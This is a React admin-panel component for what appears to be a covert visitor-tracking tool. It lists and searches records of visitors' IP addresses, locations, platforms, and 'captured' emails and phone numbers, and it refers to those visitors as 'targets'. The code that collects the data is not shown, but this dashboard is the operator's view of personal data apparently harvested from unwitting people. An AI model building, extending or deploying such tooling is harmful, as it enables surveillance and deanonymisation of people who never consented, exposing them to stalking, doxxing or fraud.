"use client";

import { useState, useEffect } from 'react';

export default function AdminPage() {
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [logs, setLogs] = useState([]);
    const [query, setQuery] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [newUser, setNewUser] = useState('');
    const [newPass, setNewPass] = useState('');

    const handleLogin = async (e) => {
        e.preventDefault();
        setError('');
        try {
            const res = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'login', username, password })
            });
            const json = await res.json();
            if (json.success) {
                setIsLoggedIn(true);
                fetchLogs();
            } else {
                setError('Invalid Credentials');
            }
        } catch (err) {
            setError('Login failed');
        }
    };

    const fetchLogs = async () => {
        setLoading(true);
        try {
            const res = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'list', username, password })
            });
            const json = await res.json();
            if (json.success) setLogs(json.logs);
        } catch (err) {
            console.error('Fetch failed');
        }
        setLoading(false);
    };

    const handleSearch = async (e) => {
        e.preventDefault();
        setLoading(true);
        try {
            const res = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'search', username, password, query })
            });
            const json = await res.json();
            if (json.success) setLogs(json.logs);
        } catch (err) {
            console.error('Search failed');
        }
        setLoading(false);
    };

    const handleAddUser = async (e) => {
        e.preventDefault();
        try {
            const res = await fetch('/api/admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'addUser', username, password, newUser, newPass })
            });
            const json = await res.json();
            if (json.success) {
                alert('Admin added!');
                setNewUser('');
                setNewPass('');
            }
        } catch (err) {
            alert('Failed to add admin');
        }
    };

    if (!isLoggedIn) {
        return (
            <main className="container">
                <div className="glass-panel" style={{ maxWidth: '400px' }}>
                    <h1 className="title" style={{ fontSize: '2rem' }}>ADMIN PANEL</h1>
                    <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                        <input
                            type="text"
                            placeholder="Username"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            className="share-input"
                            required
                        />
                        <input
                            type="password"
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="share-input"
                            required
                        />
                        {error && <p style={{ color: '#ff4d4d', fontSize: '0.8rem', textAlign: 'center' }}>{error}</p>}
                        <button type="submit" className="share-button">AUTHORIZE ACCESS</button>
                    </form>
                </div>
            </main>
        );
    }

    return (
        <main className="container" style={{ justifyContent: 'flex-start', padding: '2rem' }}>
            <div className="glass-panel" style={{ maxWidth: '1200px', width: '100%', marginBottom: '2rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem' }}>
                    <h1 className="title" style={{ fontSize: '2rem', margin: 0 }}>INTELLIGENCE DATABASE</h1>
                    <button onClick={() => setIsLoggedIn(false)} className="share-button" style={{ background: '#333', color: '#fff' }}>LOGOUT</button>
                </div>

                <div className="data-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', marginBottom: '2rem', border: '1px solid #222', padding: '1rem', borderRadius: '12px' }}>
                    <div>
                        <h2 className="section-title" style={{ marginTop: 0 }}>Search Intelligence</h2>
                        <form onSubmit={handleSearch} style={{ display: 'flex', gap: '10px' }}>
                            <input
                                type="text"
                                placeholder="Search by IP, Email, Phone, Location..."
                                value={query}
                                onChange={(e) => setQuery(e.target.value)}
                                className="share-input"
                            />
                            <button type="submit" className="share-button">QUERY</button>
                        </form>
                    </div>
                    <div>
                        <h2 className="section-title" style={{ marginTop: 0 }}>Add Admin User</h2>
                        <form onSubmit={handleAddUser} style={{ display: 'flex', gap: '10px' }}>
                            <input
                                type="text"
                                placeholder="New User"
                                value={newUser}
                                onChange={(e) => setNewUser(e.target.value)}
                                className="share-input"
                                style={{ flex: 1 }}
                            />
                            <input
                                type="password"
                                placeholder="Pass"
                                value={newPass}
                                onChange={(e) => setNewPass(e.target.value)}
                                className="share-input"
                                style={{ flex: 1 }}
                            />
                            <button type="submit" className="share-button">ADD</button>
                        </form>
                    </div>
                </div>

                <div style={{ overflowX: 'auto' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.85rem' }}>
                        <thead>
                            <tr style={{ background: '#111', color: 'var(--primary)', textAlign: 'left' }}>
                                <th style={thStyle}>Date</th>
                                <th style={thStyle}>IP / ID</th>
                                <th style={thStyle}>Location</th>
                                <th style={thStyle}>Captured Email</th>
                                <th style={thStyle}>Captured Phone</th>
                                <th style={thStyle}>Platform</th>
                            </tr>
                        </thead>
                        <tbody>
                            {loading ? (
                                <tr><td colSpan="6" style={{ textAlign: 'center', padding: '2rem' }}>SCANNING DATABASE...</td></tr>
                            ) : logs.length === 0 ? (
                                <tr><td colSpan="6" style={{ textAlign: 'center', padding: '2rem' }}>NO TARGETS FOUND.</td></tr>
                            ) : logs.map(log => (
                                <tr key={log.id} style={{ borderBottom: '1px solid #222' }}>
                                    <td style={tdStyle}>{new Date(log.createdAt).toLocaleString()}</td>
                                    <td style={tdStyle}>
                                        <div style={{ fontWeight: 'bold' }}>{log.ip}</div>
                                        <div style={{ fontSize: '0.7rem', color: '#555' }}>{log.systemId}</div>
                                    </td>
                                    <td style={tdStyle}>{log.city}, {log.country}</td>
                                    <td style={tdStyle}><span style={{ color: log.visitorEmail ? 'var(--primary)' : '#444' }}>{log.visitorEmail || 'N/A'}</span></td>
                                    <td style={tdStyle}><span style={{ color: log.visitorPhone ? 'var(--primary)' : '#444' }}>{log.visitorPhone || 'N/A'}</span></td>
                                    <td style={tdStyle}>{log.platform}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
            </div>
        </main>
    );
}

const thStyle = { padding: '12px', borderBottom: '2px solid #222' };
const tdStyle = { padding: '12px' };
